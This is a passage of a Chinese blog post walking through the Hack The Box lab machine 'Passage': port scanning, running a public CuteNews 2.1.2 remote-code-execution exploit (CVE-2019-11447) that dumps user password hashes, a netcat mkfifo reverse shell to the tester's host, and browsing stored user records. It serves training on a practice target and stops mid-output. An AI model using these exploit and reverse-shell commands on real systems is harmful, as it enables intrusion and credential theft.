@@ -1,0 +1,824 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shiyan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x00 靶场技能介绍章节技能：WEB页面目录分析、CVE-2019-11447、WEB服务数据库枚举、bash脚本编写、sha256加密破解、账号密码复用、ssh秘钥复用、某个sudo绕过漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Passage-htb-writeup">
+<meta property="og:url" content="https://sh1yan.top/2024/01/12/Passage-htb-writeup/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x00 靶场技能介绍章节技能：WEB页面目录分析、CVE-2019-11447、WEB服务数据库枚举、bash脚本编写、sha256加密破解、账号密码复用、ssh秘钥复用、某个sudo绕过漏洞">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://sh1yan.top/photo/Passage-htb-writeup/1.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Passage-htb-writeup/2.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Passage-htb-writeup/3.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Passage-htb-writeup/4.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Passage-htb-writeup/5.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Passage-htb-writeup/6.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Passage-htb-writeup/8.png">
+<meta property="article:published_time" content="2024-01-12T15:50:55.000Z">
+<meta property="article:modified_time" content="2024-02-04T06:48:09.080Z">
+<meta property="article:author" content="shiyan">
+<meta property="article:tag" content="shooting-range">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://sh1yan.top/photo/Passage-htb-writeup/1.png">
+  
+  
+  
+  <title>Passage-htb-writeup - sh1yan&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh1yan&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/yqlj/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-th-large"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/open-source/" target="_self">
+                    
+                    <span>我开源的安全项目</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
+                    
+                    <span>反弹shell命令集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/P2note/" target="_self">
+                    
+                    <span>综合安全工具集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
+                    
+                    <span>网站开发者工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/linux-command/" target="_self">
+                    
+                    <span>Linux命令工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/CyberChef/" target="_self">
+                    
+                    <span>CyberChef工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
+                    
+                    <span>开发者速查备忘录</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Passage-htb-writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-01-12 23:50" pubdate>
+          2024年1月12日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          24k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          200 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Passage-htb-writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：WEB页面目录分析、CVE-2019-11447、WEB服务数据库枚举、bash脚本编写、sha256加密破解、账号密码复用、ssh秘钥复用、某个sudo绕过漏洞</p>
+<span id="more"></span>  
+
+<p>参考链接：<code>https://0xdf.gitlab.io/2021/03/06/htb-passage.html</code></p>
+<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、获取下靶机IP地址：10.10.10.206</p>
+<p>2、扫描下开放端口情况</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面/tools/portscan]<br>└─$ sudo ./htb-portscan.sh 10.10.10.206 tcp                             <br>[sudo] kali 的密码：<br>开始对 10.10.10.206 进行nmap端口扫描...<br>* 正在执行tcp协议的端口扫描探测...<br>sudo nmap -min-rate 10000 -p- <span class="hljs-string">&quot;10.10.10.206&quot;</span> -oG <span class="hljs-string">&quot;10.10.10.206&quot;</span>-tcp-braker-allports<br><br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-12 16:10 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.206<br>Host is up (0.31s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 11.04 seconds<br>* 正在对开放的端口进行TCP全连接式版本探测和系统版本以及漏洞探测...<br>sudo nmap -sT -sV -sC -p<span class="hljs-string">&quot;22,80,&quot;</span> <span class="hljs-string">&quot;10.10.10.206&quot;</span><br><br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-12 16:10 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.206<br>Host is up (0.37s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)<br>|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:<span class="hljs-built_in">fc</span> (ECDSA)<br>|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))<br>|_http-title: Passage News<br>|_http-server-header: Apache/2.4.18 (Ubuntu)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 25.32 seconds<br></code></pre></td></tr></table></figure>
+
+<p>3、目前只开放了2个端口，现在访问下80端口看看</p>
+<p><code>http://10.10.10.206/</code></p>
+<p><img src="http://sh1yan.top/photo/Passage-htb-writeup/1.png" srcset="/img/loading.gif" lazyload></p>
+<p>4、首页第一个文章提示了一些信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">由于异常大量的交通，我们已经在我们的网站上实施Fail2Ban.请注意，过度访问我们的服务器将被禁止使用您的IP地址。虽然我们不希望锁定我们的合法用户，但为了确保安全的观看体验，这一决定是必要的。当您浏览我们广泛的新闻选择时，请谨慎行事。查看和评论 <br></code></pre></td></tr></table></figure>
+
+<p>5、通过查看网站底部的信息，我们知道了这个是 CuteNews 系统，并且链接到了他的源码地址，通过查看github，可以发现这是一个很老的系统了，没有更新和维护了</p>
+<p><code>Powered by CuteNews</code></p>
+<p><img src="http://sh1yan.top/photo/Passage-htb-writeup/2.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>https://github.com/CuteNews/cutenews-2.0</code></p>
+<p>6、通过在页面上检索，发现了<code>http://10.10.10.206/CuteNews/rss.php</code>路径地址，然后在访问时 <code>http://10.10.10.206/CuteNews/</code> 时，页面显示是一个登录界面，还有版本信息</p>
+<p><img src="http://sh1yan.top/photo/Passage-htb-writeup/3.png" srcset="/img/loading.gif" lazyload></p>
+<p>7、下面注册一个账号进行登录查看下</p>
+<p><code>http://10.10.10.206/CuteNews/?register</code></p>
+<p><code>test:test</code></p>
+<p><img src="http://sh1yan.top/photo/Passage-htb-writeup/4.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>http://10.10.10.206/CuteNews/index.php</code></p>
+<p><img src="http://sh1yan.top/photo/Passage-htb-writeup/5.png" srcset="/img/loading.gif" lazyload></p>
+<p>8、其实这里可以发现当前CMS的版本信息</p>
+<p><code>CuteNews v2.1.2</code></p>
+<p>9、搜索下这个版本的漏洞情况</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ searchsploit CuteNews 2.1.2<br>-------------------------------------------------------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                                                                            |  Path<br>-------------------------------------------------------------------------------------------------------------------------- ---------------------------------<br>CuteNews 2.1.2 - <span class="hljs-string">&#x27;avatar&#x27;</span> Remote Code Execution (Metasploit)                                                              | php/remote/46698.rb<br>CuteNews 2.1.2 - Arbitrary File Deletion                                                                                  | php/webapps/48447.txt<br>CuteNews 2.1.2 - Authenticated Arbitrary File Upload                                                                      | php/webapps/48458.txt<br>CuteNews 2.1.2 - Remote Code Execution                                                                                    | php/webapps/48800.py<br>-------------------------------------------------------------------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ searchsploit -m php/webapps/48800.py <br>  Exploit: CuteNews 2.1.2 - Remote Code Execution<br>      URL: https://www.exploit-db.com/exploits/48800<br>     Path: /usr/share/exploitdb/exploits/php/webapps/48800.py<br>    Codes: CVE-2019-11447<br> Verified: True<br>File Type: Python script, ASCII text executable<br>Copied to: /home/kali/桌面/48800.py<br></code></pre></td></tr></table></figure>
+
+<p>10、这里下载这个远程命令执行的漏洞，发现了一个亮点，和github上一个的评论的版本一致</p>
+<p><img src="http://sh1yan.top/photo/Passage-htb-writeup/6.png" srcset="/img/loading.gif" lazyload></p>
+<p>11、这里先绑定下hosts，这个地址是在前台和后台都看到的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;10.10.10.206 passage.htb&quot;</span> | sudo <span class="hljs-built_in">tee</span> -a /etc/hosts<br>[sudo] kali 的密码：<br>10.10.10.206 passage.htb<br></code></pre></td></tr></table></figure>
+
+<p>12、开始尝试利用这个漏洞</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ python3 48800.py<br><br>           _____     __      _  __                     ___   ___  ___<br>          / ___/_ __/ /____ / |/ /__ _    _____       |_  | &lt;  / |_  |<br>         / /__/ // / __/ -_)    / -_) |/|/ (_-&lt;      / __/_ / / / __/<br>         \___/\_,_/\__/\__/_/|_/\__/|__,__/___/     /____(_)_(_)____/<br>                                ___  _________<br>                               / _ \/ ___/ __/<br>                              / , _/ /__/ _/<br>                             /_/|_|\___/___/<br><br><br>[-&gt;] Usage python3 expoit.py<br><br>Enter the URL&gt; http://10.10.10.206<br>================================================================<br>Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN<br>================================================================<br>7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1<br>4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88<br>e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd<br>f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca<br>4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc<br>================================================================<br><br>=============================<br>Registering a <span class="hljs-built_in">users</span><br>=============================<br>[+] Registration successful with username: fN34nPPzK0 and password: fN34nPPzK0<br><br>=======================================================<br>Sending Payload<br>=======================================================<br>signature_key: d3895d20c2d2191e0f5ad06472a27e97-fN34nPPzK0<br>signature_dsi: 1b72189238f74644dade998b6be6f053<br>logged <span class="hljs-keyword">in</span> user: fN34nPPzK0<br>============================<br>Dropping to a SHELL<br>============================<br><br><span class="hljs-built_in">command</span> &gt; <span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br><br><span class="hljs-built_in">command</span> &gt; <br></code></pre></td></tr></table></figure>
+
+<p>13、这里漏洞可以正常利用，那就构造一个反弹shell吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">command</span> &gt; <span class="hljs-built_in">rm</span> /tmp/f;<span class="hljs-built_in">mkfifo</span> /tmp/f;<span class="hljs-built_in">cat</span> /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.14.8 443 &gt;/tmp/f   <br></code></pre></td></tr></table></figure>
+
+<p>14、成功获取到第一个初始的shell环境</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ nc -lvnp 443<br>listening on [any] 443 ...<br>connect to [10.10.14.8] from (UNKNOWN) [10.10.10.206] 49008<br>sh: 0: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ python3 -c &#x27;</span>import pty;pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">www-data@passage:/var/www/html/CuteNews/uploads$ </span><br><span class="hljs-string"></span><br><span class="hljs-string">www-data@passage:/var/www/html/CuteNews/uploads$ id</span><br><span class="hljs-string">id</span><br><span class="hljs-string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="hljs-string">www-data@passage:/var/www/html/CuteNews/uploads$</span><br></code></pre></td></tr></table></figure>
+
+<p>15、通过查看 &#x2F;home 目录，发现存在2个用户，且都没有权限查看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@passage:/var/www/html/CuteNews/uploads$ <span class="hljs-built_in">ls</span> -la /home<br><span class="hljs-built_in">ls</span> -la /home<br>total 16<br>drwxr-xr-x  4 root  root  4096 Jul 21  2020 .<br>drwxr-xr-x 23 root  root  4096 Jul 21  2020 ..<br>drwxr-x--- 17 nadav nadav 4096 Jan 12 00:07 nadav<br>drwxr-x--- 16 paul  paul  4096 Sep  2  2020 paul<br>www-data@passage:/var/www/html/CuteNews/uploads$ <br></code></pre></td></tr></table></figure>
+
+<p>16、通过不断的在网站目录下翻文件，终于翻到一些信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@passage:/var/www/html/CuteNews/cdata$ <span class="hljs-built_in">cd</span> <span class="hljs-built_in">users</span><br><span class="hljs-built_in">cd</span> <span class="hljs-built_in">users</span><br>www-data@passage:/var/www/html/CuteNews/cdata/users$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>09.php  21.php  5d.php  6e.php  7a.php  b0.php  d4.php  f6.php  lines<br>0a.php  32.php  66.php  71.php  8f.php  bf.php  d5.php  f9.php  users.txt<br>16.php  52.php  6d.php  77.php  97.php  c8.php  d6.php  fc.php<br>www-data@passage:/var/www/html/CuteNews/cdata/users$ <br>www-data@passage:/var/www/html/CuteNews/cdata/users$ <span class="hljs-built_in">cat</span> 09.php<br><span class="hljs-built_in">cat</span> 09.php<br>&lt;?php die(<span class="hljs-string">&#x27;Direct call - access denied&#x27;</span>); ?&gt;<br>YToyOntzOjU6ImVtYWlsIjthOjE6e3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6MTA6InBhdWwtY29sZXMiO31zOjQ6Im5hbWUiO2E6MTp7czo0OiJ0ZXN0IjthOjY6e3M6MjoiaWQiO3M6MTA6IjE3MDUwNDc5NzEiO3M6NDoibmFtZSI7czo0OiJ0ZXN0IjtzOjM6ImFjbCI7czoxOiI0IjtzOjU6ImVtYWlsIjtzOjExOiJ0ZXN0QHFxLmNvbSI7czo0OiJuaWNrIjtzOjQ6InRlc3QiO3M6NDoicGFzcyI7czo2NDoiOWY4NmQwODE4ODRjN2Q2NTlhMmZlYWEwYzU1YWQwMTVhM2JmNGYxYjJiMGI4MjJjZDE1ZDZjMTViMGYwMGEwOCI7fX19www-data@passage:/var/www/html/CuteNews/cdata/users$ <br></code></pre></td></tr></table></figure>
+
+<p>17、通过解码发现发现了一些账号信息，且这个账号就是我注册的账号信息</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-attr">a</span>:<span class="hljs-number">2</span>:&#123;<span class="hljs-attr">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;email&quot;</span>;<span class="hljs-attr">a</span>:<span class="hljs-number">1</span>:&#123;<span class="hljs-attr">s</span>:<span class="hljs-number">16</span>:<span class="hljs-string">&quot;paul@passage.htb&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;paul-coles&quot;</span>;&#125;<span class="hljs-attr">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;<span class="hljs-attr">a</span>:<span class="hljs-number">1</span>:&#123;<span class="hljs-attr">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;<span class="hljs-attr">a</span>:<span class="hljs-number">6</span>:&#123;<span class="hljs-attr">s</span>:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;id&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;1705047971&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;acl&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;4&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;email&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;test@qq.com&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;nick&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;pass&quot;</span>;<span class="hljs-attr">s</span>:<span class="hljs-number">64</span>:<span class="hljs-string">&quot;9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08&quot;</span>;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>18、通过查看 lines 文件信息，发现一堆base64的编码的信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@passage:/var/www/html/CuteNews/cdata/users$ <span class="hljs-built_in">cat</span> lines<br><span class="hljs-built_in">cat</span> lines<br>&lt;?php die(<span class="hljs-string">&#x27;Direct call - access denied&#x27;</span>); 